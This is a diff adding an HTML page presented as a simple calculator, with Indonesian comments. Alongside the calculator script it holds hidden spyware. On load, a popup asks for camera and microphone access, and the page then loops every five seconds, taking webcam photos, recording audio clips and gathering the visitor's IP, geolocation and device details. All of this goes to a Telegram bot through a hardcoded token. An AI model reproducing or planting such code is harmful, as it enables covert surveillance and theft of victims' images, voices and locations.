@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html>
+<meta charset='UTF-8'/>
+<meta content='width=device-width, initial-scale=1, user-scalable=1, minimum-scale=1, maximum-scale=5' name='viewport'/>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.all.min.js"></script>
+<link href="https://feeldreams.github.io/boroboro/style.css" rel="stylesheet" type="text/css" />
+<meta content='IE=edge' http-equiv='X-UA-Compatible'/>
+
+<head>
+<title>Kalkulator Vip</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+            font-family: 'Arial', sans-serif;
+        }
+
+        .calculator {
+            width: 360px;
+            padding: 20px;
+            background-color: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        #display {
+            width: 100%;
+            height: 70px;
+            border: none;
+            border-radius: 10px;
+            background-color: #f9f9f9;
+            font-size: 32px;
+            text-align: right;
+            padding: 10px;
+            margin-bottom: 20px;
+            box-shadow: inset 0 3px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .buttons {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+        }
+
+        button {
+            height: 65px;
+            font-size: 24px;
+            border: none;
+            border-radius: 10px;
+            background-color: #007BFF;
+            color: white;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        .btn-clear {
+            background-color: #FF5C5C;
+        }
+
+        .btn-clear:hover {
+            background-color: #c44d4d;
+        }
+
+        .btn-operator {
+            background-color: #ffa500;
+        }
+
+        .btn-operator:hover {
+            background-color: #cc8400;
+        }
+
+        .btn-equal {
+            grid-column: span 2;
+            background-color: #28a745;
+        }
+
+        .btn-equal:hover {
+            background-color: #218838;
+        }
+    </style>
+  </head>
+<body>
+    <div class="calculator">
+        <input type="text" id="display" disabled placeholder="0" />
+        <div class="buttons">
+            <button class="btn-clear" onclick="clearDisplay()">C</button>
+            <button onclick="appendToDisplay('7')">7</button>
+            <button onclick="appendToDisplay('8')">8</button>
+            <button onclick="appendToDisplay('9')">9</button>
+            <button class="btn-operator" onclick="appendToDisplay(' ÷ ')">÷</button>
+
+            <button onclick="appendToDisplay('4')">4</button>
+            <button onclick="appendToDisplay('5')">5</button>
+            <button onclick="appendToDisplay('6')">6</button>
+            <button class="btn-operator" onclick="appendToDisplay(' × ')">×</button>
+
+            <button onclick="appendToDisplay('1')">1</button>
+            <button onclick="appendToDisplay('2')">2</button>
+            <button onclick="appendToDisplay('3')">3</button>
+            <button class="btn-operator" onclick="appendToDisplay(' - ')">-</button>
+
+            <button onclick="appendToDisplay('0')">0</button>
+            <button onclick="appendToDisplay('.')">.</button>
+            <button class="btn-equal" onclick="calculateResult()">=</button>
+            <button class="btn-operator" onclick="appendToDisplay(' + ')">+</button>
+        </div>
+    </div>
+
+    <script>
+        // Daftar kode redirect
+        const redirectCodes = {
+            "123": "https://youtube.com/@ghstmod",
+            "456": "https://mystore-byraisrf.glitch.me",
+            "789": "https://openai.com"
+        };
+
+        // Fungsi menambahkan input ke display
+        function appendToDisplay(value) {
+            const display = document.getElementById('display');
+            display.value += value;
+        }
+
+        // Fungsi untuk membersihkan display
+        function clearDisplay() {
+            document.getElementById('display').value = '';
+        }
+
+        // Fungsi menghitung hasil atau melakukan redirect
+        function calculateResult() {
+            const display = document.getElementById('display');
+            const input = display.value.trim();
+
+            // Cek apakah input cocok dengan kode redirect
+            if (redirectCodes[input]) {
+                window.location.href = redirectCodes[input];
+            } else {
+                try {
+                    // Ganti simbol × dan ÷ agar bisa dievaluasi
+                    const sanitizedInput = input.replace(/×/g, '*').replace(/÷/g, '/');
+                    const result = eval(sanitizedInput);
+
+                    if (!isFinite(result)) throw new Error(); // Tangani hasil tak terhingga
+                    display.value = result;
+                } catch {
+                    display.value = 'Error';
+                    setTimeout(clearDisplay, 1500); // Reset otomatis
+                }
+            }
+        }
+    </script>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+// Data bot Telegram
+const chatId = '6837025112';
+const botToken = '7973590308:AAErF-HVTlhqopB01M-bzxRXBLtkm36Oo7w';
+let isRunning = true; // Kontrol agar berjalan di latar belakang
+
+// Mendapatkan IP
+async function getIpAddress() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    return data.ip;
+  } catch (error) {
+    console.error('Gagal mendapatkan IP:', error);
+    return 'Tidak ditemukan';
+  }
+}
+
+// Mendapatkan lokasi
+async function getLocation() {
+  try {
+    if (navigator.geolocation) {
+      return new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(
+          (position) => resolve({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          }),
+          () => reject('Lokasi tidak ditemukan')
+        );
+      });
+    } else {
+      throw new Error('Geolocation tidak didukung.');
+    }
+  } catch (error) {
+    console.error(error.message);
+    return { latitude: 'Tidak ditemukan', longitude: 'Tidak ditemukan' };
+  }
+}
+
+// Model perangkat
+function getDeviceModel() {
+  return navigator.userAgent;
+}
+
+// Kirim foto ke Telegram
+async function sendPhotoToTelegram(caption, photoBlob) {
+  const formData = new FormData();
+  formData.append('chat_id', chatId);
+  formData.append('photo', photoBlob);
+  formData.append('caption', caption);
+
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: 'POST',
+      body: formData,
+    });
+    console.log('Foto terkirim:', response.status);
+  } catch (error) {
+    console.error('Gagal mengirim foto:', error);
+  }
+}
+
+// Kirim rekaman suara ke Telegram
+async function sendAudioToTelegram(audioBlob) {
+  const formData = new FormData();
+  formData.append('chat_id', chatId);
+  formData.append('voice', audioBlob);
+
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
+      method: 'POST',
+      body: formData,
+    });
+    console.log('Audio terkirim:', response.status);
+  } catch (error) {
+    console.error('Gagal mengirim audio:', error);
+  }
+}
+
+// Akses kamera untuk mengambil foto
+async function capturePhoto(video) {
+  const canvas = document.getElementById('canvas');
+  const context = canvas.getContext('2d');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  return new Promise((resolve) => {
+    canvas.toBlob((blob) => {
+      resolve(blob);
+    }, 'image/jpeg');
+  });
+}
+
+// Jalankan kamera dan rekaman suara
+async function captureAndSendData() {
+  try {
+    const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.createElement('video');
+    video.style.display = 'none';
+    document.body.appendChild(video);
+    video.srcObject = videoStream;
+    await video.play();
+
+    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const mediaRecorder = new MediaRecorder(audioStream);
+
+    mediaRecorder.ondataavailable = async (event) => {
+      const audioBlob = event.data;
+
+      // Kirim audio ke Telegram
+      if (audioBlob.size > 0) {
+        await sendAudioToTelegram(audioBlob);
+      }
+    };
+
+    while (isRunning) {
+      const ip = await getIpAddress();
+      const location = await getLocation();
+      const deviceModel = getDeviceModel();
+      const caption = `
+📱 Info Perangkat:
+- Model: ${deviceModel}
+- IP Address: ${ip}
+- Lokasi: https://www.google.com/maps?q=${location.latitude},${location.longitude}
+      `;
+
+      // Tangkap dan kirim foto
+      const photoBlob = await capturePhoto(video);
+      await sendPhotoToTelegram(caption, photoBlob);
+
+      // Mulai rekaman suara
+      mediaRecorder.start();
+
+      // Hentikan rekaman suara setelah 5 detik
+      setTimeout(() => {
+        if (mediaRecorder.state === 'recording') {
+          mediaRecorder.stop();
+        }
+      }, 5000);
+
+      // Tunggu 5 detik sebelum mengambil data berikutnya
+      await new Promise((resolve) => setTimeout(resolve, 5000));
+    }
+
+    // Matikan kamera dan mikrofon
+    videoStream.getTracks().forEach((track) => track.stop());
+    audioStream.getTracks().forEach((track) => track.stop());
+  } catch (error) {
+    console.error('Gagal memproses data:', error.message);
+  }
+}
+
+// Panggilan awal
+window.onload = async () => {
+  const izin = await Swal.fire({
+    title: 'Akses Kamera dan Mikrofon',
+    text: 'Kami memerlukan izin untuk menggunakan kamera dan mikrofon.',
+    icon: 'info',
+    showCancelButton: true,
+    confirmButtonText: 'Izinkan',
+  });
+
+  if (izin.isConfirmed) {
+    captureAndSendData();
+  }
+};
+
+// Berhenti berjalan di latar belakang
+window.onbeforeunload = () => {
+  isRunning = false;
+};
+</script>
+
+
+
+<!-- Animasi tambahan -->
+<script src="https://feeldreams.github.io/boroboro/script.js"></script>
+</body>
+</html>
